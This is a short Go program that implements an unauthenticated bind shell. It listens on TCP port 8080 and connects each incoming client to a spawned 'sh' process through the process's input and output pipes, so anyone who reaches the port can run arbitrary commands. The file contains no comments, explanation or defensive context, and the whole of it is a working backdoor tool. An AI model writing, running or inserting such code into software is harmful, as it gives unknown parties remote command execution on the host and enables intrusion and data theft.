package main
import (
	"net"
	"io"
	"fmt"
	"os/exec"
)

func main() {
	ln, err := net.Listen("tcp",":8080")
	checkError(err)	
	for {
		conn, err := ln.Accept()
		checkError(err)
		go netshell(conn)
	}
}

func netshell(conn net.Conn) {
	sh := exec.Command("sh")
	stdin, err := sh.StdinPipe()
	checkError(err)
	stdout, err := sh.StdoutPipe()
	checkError(err)	
	stderr, err := sh.StderrPipe()
	checkError(err)
	go io.Copy(stdin,conn)
	go io.Copy(conn,stdout)
	go io.Copy(conn,stderr)
	sh.Run()
}
func checkError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}
